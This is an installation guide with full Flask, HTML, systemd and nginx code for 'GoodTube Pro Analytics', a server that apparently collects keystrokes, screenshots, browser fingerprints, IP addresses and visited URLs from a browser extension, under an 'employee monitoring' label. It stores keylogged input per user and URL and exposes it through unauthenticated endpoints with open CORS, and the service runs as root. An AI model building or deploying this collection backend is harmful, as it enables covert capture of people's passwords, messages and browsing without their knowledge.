# 🔧 Manual Installation Guide - All Files

Since the automated installer is having issues, let's create all files manually. Follow these steps exactly:

## 📁 **Step 1: Create Directory Structure**

```bash
# Create main directory
sudo mkdir -p /opt/goodtube-analytics
cd /opt/goodtube-analytics

# Create subdirectories
sudo mkdir -p templates static/css static/js logs uploads screenshots backups

# Set ownership
sudo chown -R $USER:$USER /opt/goodtube-analytics
```

## 📝 **Step 2: Create requirements.txt**

```bash
cat > /opt/goodtube-analytics/requirements.txt << 'EOF'
Flask==2.3.3
Flask-CORS==4.0.0
Werkzeug==2.3.7
gunicorn==21.2.0
EOF
```

## 🐍 **Step 3: Create app.py**

```bash
cat > /opt/goodtube-analytics/app.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime, timedelta
import hashlib
import base64
from werkzeug.utils import secure_filename
import threading
import time

app = Flask(__name__)
CORS(app)

DATABASE_PATH = 'analytics.db'
UPLOAD_FOLDER = 'uploads'
SCREENSHOTS_FOLDER = 'screenshots'
MAX_CONTENT_LENGTH = 16 * 1024 * 1024

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(SCREENSHOTS_FOLDER, exist_ok=True)
os.makedirs('static', exist_ok=True)
os.makedirs('templates', exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

def init_database():
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE NOT NULL,
            browser_fingerprint TEXT,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_sessions INTEGER DEFAULT 0,
            total_events INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            user_id TEXT NOT NULL,
            start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            end_time TIMESTAMP,
            duration INTEGER DEFAULT 0,
            page_count INTEGER DEFAULT 0,
            event_count INTEGER DEFAULT 0,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            event_data TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id),
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            keystroke TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        user_id = data.get('userId')
        session_id = data.get('sessionId')
        
        if not user_id or not session_id:
            return jsonify({'error': 'Missing userId or sessionId'}), 400
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, browser_fingerprint, ip_address, user_agent, last_seen, total_sessions, total_events)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_sessions FROM users WHERE user_id = ?), 0) + 1,
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, data.get('browserFingerprint'), request.remote_addr, 
              request.headers.get('User-Agent'), user_id, user_id))
        
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (session_id, user_id, start_time, event_count)
            VALUES (?, ?, COALESCE((SELECT start_time FROM sessions WHERE session_id = ?), CURRENT_TIMESTAMP),
                    COALESCE((SELECT event_count FROM sessions WHERE session_id = ?), 0) + 1)
        ''', (session_id, user_id, session_id, session_id))
        
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type'), 
                  json.dumps(event.get('data', {})), event.get('url')))
        
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key'), keystroke.get('url')))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Analytics data received'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    try:
        data = request.get_json()
        user_id = data.get('userId')
        session_id = data.get('sessionId')
        screenshot_data = data.get('screenshot')
        url = data.get('url')
        
        if not all([user_id, session_id, screenshot_data]):
            return jsonify({'error': 'Missing required data'}), 400
        
        screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{user_id}_{session_id}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(screenshot_bytes)
        
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO screenshots (user_id, session_id, filename, url)
            VALUES (?, ?, ?, ?)
        ''', (user_id, session_id, filename, url))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'filename': filename})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        cursor.execute('''
            SELECT COUNT(*) as count FROM sessions 
            WHERE start_time > datetime('now', '-24 hours')
        ''')
        active_sessions = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        cursor.execute('''
            SELECT e.*, u.user_id FROM events e
            JOIN users u ON e.user_id = u.user_id
            ORDER BY e.timestamp DESC LIMIT 10
        ''')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': active_sessions,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(DISTINCT s.session_id) as session_count,
                   COUNT(e.id) as event_count,
                   COUNT(k.id) as keystroke_count,
                   COUNT(sc.id) as screenshot_count
            FROM users u
            LEFT JOIN sessions s ON u.user_id = s.user_id
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots sc ON u.user_id = sc.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

if __name__ == '__main__':
    init_database()
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
```

## 🎨 **Step 4: Create HTML Template**

```bash
cat > /opt/goodtube-analytics/templates/dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodTube Pro Analytics Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%);
            color: #F8FAFC;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
        .header { text-align: center; margin-bottom: 3rem; }
        .header h1 { 
            font-size: 2.5rem; 
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 1.5rem; 
            margin-bottom: 3rem;
        }
        .stat-card { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 1.5rem;
            text-align: center;
        }
        .stat-number { 
            font-size: 2rem; 
            font-weight: bold; 
            color: #8B5CF6; 
            margin-bottom: 0.5rem;
        }
        .stat-label { color: #CBD5E1; }
        .content-section { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 2rem;
        }
        .section-title { 
            font-size: 1.5rem; 
            margin-bottom: 1rem; 
            color: #F8FAFC;
        }
        .activity-item { 
            padding: 1rem; 
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            justify-content: space-between;
        }
        .activity-item:last-child { border-bottom: none; }
        .activity-details h4 { color: #F8FAFC; margin-bottom: 0.25rem; }
        .activity-details p { color: #94A3B8; font-size: 0.875rem; }
        .activity-time { color: #94A3B8; font-size: 0.875rem; }
        .refresh-btn {
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .refresh-btn:hover { transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ GoodTube Pro Analytics</h1>
            <p>Employee Monitoring Dashboard</p>
            <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeSessions">0</div>
                <div class="stat-label">Active Sessions (24h)</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalEvents">0</div>
                <div class="stat-label">Total Events</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>
        
        <div class="content-section">
            <h2 class="section-title">📊 Recent Activity</h2>
            <div id="recentActivity">
                <div class="activity-item">
                    <div class="activity-details">
                        <h4>Loading...</h4>
                        <p>Please wait while we load the latest activity data</p>
                    </div>
                    <div class="activity-time">Now</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                document.getElementById('totalUsers').textContent = data.totalUsers || 0;
                document.getElementById('activeSessions').textContent = data.activeSessions || 0;
                document.getElementById('totalEvents').textContent = data.totalEvents || 0;
                document.getElementById('totalScreenshots').textContent = data.totalScreenshots || 0;
                
                const activityContainer = document.getElementById('recentActivity');
                if (data.recentEvents && data.recentEvents.length > 0) {
                    activityContainer.innerHTML = data.recentEvents.map(event => `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>${event.event_type || 'Unknown Event'}</h4>
                                <p>User: ${event.user_id} • URL: ${(event.url || 'N/A').substring(0, 50)}...</p>
                            </div>
                            <div class="activity-time">${new Date(event.timestamp).toLocaleString()}</div>
                        </div>
                    `).join('');
                } else {
                    activityContainer.innerHTML = `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>No Recent Activity</h4>
                                <p>No events have been recorded yet. Install the browser extension to start monitoring.</p>
                            </div>
                            <div class="activity-time">-</div>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('recentActivity').innerHTML = `
                    <div class="activity-item">
                        <div class="activity-details">
                            <h4>Error Loading Data</h4>
                            <p>Failed to connect to the analytics API. Please check the server status.</p>
                        </div>
                        <div class="activity-time">Error</div>
                    </div>
                `;
            }
        }
        
        // Load data when page loads
        document.addEventListener('DOMContentLoaded', loadData);
        
        // Auto-refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
</body>
</html>
EOF
```

## 🐍 **Step 5: Install Python Dependencies**

```bash
cd /opt/goodtube-analytics

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install --upgrade pip
pip install Flask==2.3.3 Flask-CORS==4.0.0 Werkzeug==2.3.7 gunicorn==21.2.0
```

## 🔧 **Step 6: Create Systemd Service**

```bash
sudo tee /etc/systemd/system/goodtube-analytics.service << 'EOF'
[Unit]
Description=GoodTube Pro Analytics Dashboard
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/goodtube-analytics
Environment=PATH=/opt/goodtube-analytics/venv/bin
ExecStart=/opt/goodtube-analytics/venv/bin/gunicorn --bind 127.0.0.1:5000 --workers 4 --timeout 120 app:app
Restart=always
RestartSec=10
StandardOutput=append:/opt/goodtube-analytics/logs/app.log
StandardError=append:/opt/goodtube-analytics/logs/error.log

[Install]
WantedBy=multi-user.target
EOF
```

## 🌐 **Step 7: Configure Nginx**

```bash
sudo tee /etc/nginx/sites-available/goodtube-analytics << 'EOF'
server {
    listen 80;
    server_name _;
    
    client_max_body_size 50M;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

# Enable the site
sudo ln -sf /etc/nginx/sites-available/goodtube-analytics /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
```

## 🚀 **Step 8: Start Services**

```bash
# Set permissions
sudo chmod -R 755 /opt/goodtube-analytics
sudo chmod +x /opt/goodtube-analytics/app.py

# Start services
sudo systemctl daemon-reload
sudo systemctl enable goodtube-analytics
sudo systemctl start goodtube-analytics
sudo systemctl restart nginx

# Check status
sudo systemctl status goodtube-analytics
sudo systemctl status nginx
```

## 🎉 **Step 9: Test Installation**

```bash
# Get your server IP
curl ifconfig.me

# Test the dashboard
curl http://localhost

# Check logs
sudo journalctl -u goodtube-analytics -f
```

## ✅ **Verification**

Your dashboard should now be available at:
- **http://YOUR_SERVER_IP**
- **http://localhost** (from server)

If everything works, you'll see the GoodTube Pro Analytics dashboard with statistics and activity monitoring!

## 🚨 **Troubleshooting**

If services fail to start:
```bash
# Check Python app directly
cd /opt/goodtube-analytics
source venv/bin/activate
python app.py

# Check logs
sudo journalctl -u goodtube-analytics -n 50
sudo tail -f /var/log/nginx/error.log
```

